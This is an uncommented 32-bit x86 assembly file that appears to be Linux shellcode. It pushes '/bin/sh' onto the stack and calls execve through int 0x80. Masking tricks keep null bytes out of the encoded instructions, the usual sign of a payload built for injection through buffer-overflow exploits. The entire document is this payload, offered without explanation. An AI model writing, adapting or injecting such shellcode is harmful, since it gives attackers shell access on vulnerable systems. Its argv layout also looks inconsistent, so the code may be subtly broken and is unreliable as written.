.globl _start

.text
_start:
	subl	$32, %esp
	xorl	%eax, %eax
	movl	%eax, 8(%esp)
	movl	$1852400175, 24(%esp)
	movl	$0xF068732F, 28(%esp)
	andl	$0x0F68732F, 28(%esp)
	xorl	%edx, %edx
	leal	24(%esp), %ebx
	movl	%ebx, 16(%esp)
	leal    16(%esp), %ecx
	movl	$0xF0F0F00B, %eax
	andl	$0x0F0F0FFF, %eax
	int	$0x80
